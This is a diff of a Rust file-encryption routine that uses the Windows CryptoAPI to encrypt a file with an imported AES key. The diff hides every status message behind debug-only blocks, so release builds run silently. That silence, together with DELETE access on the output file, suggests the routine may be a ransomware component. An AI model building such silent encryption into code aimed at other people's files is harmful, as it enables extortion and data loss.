@@ -1,22 +1,20 @@
-// ==========================================================================//
-//                               ENCRYPTION.RS                               //
-// ==========================================================================//
-
 extern crate winapi;
 
+#[cfg(debug_assertions)]
 use std::ffi::CStr;
+#[cfg(debug_assertions)]
+use winapi::um::errhandlingapi::GetLastError;
+
 use std::ffi::CString;
 use std::ptr::null_mut;
-use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::fileapi::{CreateFileA, ReadFile, WriteFile, OPEN_ALWAYS, OPEN_EXISTING};
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::wincrypt::{
     CryptAcquireContextA, CryptDestroyKey, CryptEncrypt, CryptImportKey, CryptReleaseContext,
     CRYPT_VERIFYCONTEXT, HCRYPTKEY, HCRYPTPROV, PROV_RSA_AES,
 };
-use winapi::um::winnt::DELETE;
 use winapi::um::winnt::{
-    FILE_ATTRIBUTE_NORMAL, FILE_READ_DATA, FILE_SHARE_READ, FILE_WRITE_DATA, HANDLE,
+    DELETE, FILE_ATTRIBUTE_NORMAL, FILE_READ_DATA, FILE_SHARE_READ, FILE_WRITE_DATA, HANDLE,
 };
 
 /// Function to encrypt file
@@ -33,13 +31,19 @@ pub fn encrypt(source_file: CString, dest_file: CString, aes_key: Vec<u8>) -> bo
             CRYPT_VERIFYCONTEXT,
         ) == 0
         {
-            println!(
-                "Error during CryptAcquireContext! Error code: {}",
-                GetLastError()
-            );
+            #[cfg(debug_assertions)]
+            {
+                println!(
+                    "Error during CryptAcquireContext! Error code: {}",
+                    GetLastError()
+                );
+            }
             return false;
         } else {
-            println!("A cryptographic provider has been acquired.");
+            #[cfg(debug_assertions)]
+            {
+                println!("A cryptographic provider has been acquired.");
+            }
         }
 
         // Import the AES key
@@ -52,19 +56,27 @@ pub fn encrypt(source_file: CString, dest_file: CString, aes_key: Vec<u8>) -> bo
             &mut h_key,
         ) == 0
         {
-            println!("Failed to import key, error: {:?}", GetLastError());
+            #[cfg(debug_assertions)]
+            {
+                println!("Failed to import key, error: {:?}", GetLastError());
+            }
             return false;
         } else {
-            println!("Import successful. The key is 0x{:x}", h_key);
+            #[cfg(debug_assertions)]
+            {
+                println!("Import successful. The key is 0x{:x}", h_key);
+            }
         }
 
         let block_len: u32 = 960;
         let buffer_len: u32 = 960;
-
         let mut pb_buffer: Vec<u8> = vec![0u8; buffer_len as usize];
-        println!("Memory has been allocated for the buffer.");
+        #[cfg(debug_assertions)]
+        {
+            println!("Memory has been allocated for the buffer.");
+        }
 
-        // Open the file
+        // Open the source file
         let source_handle: HANDLE = CreateFileA(
             source_file.as_ptr(),
             FILE_READ_DATA,
@@ -75,7 +87,7 @@ pub fn encrypt(source_file: CString, dest_file: CString, aes_key: Vec<u8>) -> bo
             null_mut(),
         );
 
-        // Open the dest
+        // Open the destination file
         let dest_handle: HANDLE = CreateFileA(
             dest_file.as_ptr(),
             FILE_WRITE_DATA | DELETE,
@@ -98,12 +110,15 @@ pub fn encrypt(source_file: CString, dest_file: CString, aes_key: Vec<u8>) -> bo
                 null_mut(),
             ) == 0
             {
-                let c_str: &CStr = &source_file;
-                match c_str.to_str() {
-                    Ok(str_slice) => println!("Converted CString to str: {}", str_slice),
-                    Err(e) => eprintln!("Failed to convert CString to str: {:?}", e),
+                #[cfg(debug_assertions)]
+                {
+                    let c_str: &CStr = &source_file;
+                    match c_str.to_str() {
+                        Ok(str_slice) => println!("Converted CString to str: {}", str_slice),
+                        Err(e) => eprintln!("Failed to convert CString to str: {:?}", e),
+                    }
+                    println!("Error reading");
                 }
-                println!("Error reading");
                 break;
             }
             if count < block_len {
@@ -119,7 +134,10 @@ pub fn encrypt(source_file: CString, dest_file: CString, aes_key: Vec<u8>) -> bo
                 buffer_len,
             ) == 0
             {
-                println!("Failed to encrypt, error: 0x{:x}", GetLastError());
+                #[cfg(debug_assertions)]
+                {
+                    println!("Failed to encrypt, error: 0x{:x}", GetLastError());
+                }
                 break;
             }
             if WriteFile(
@@ -130,7 +148,10 @@ pub fn encrypt(source_file: CString, dest_file: CString, aes_key: Vec<u8>) -> bo
                 null_mut(),
             ) == 0
             {
-                println!("Failed to write");
+                #[cfg(debug_assertions)]
+                {
+                    println!("Failed to write");
+                }
                 break;
             }
         }
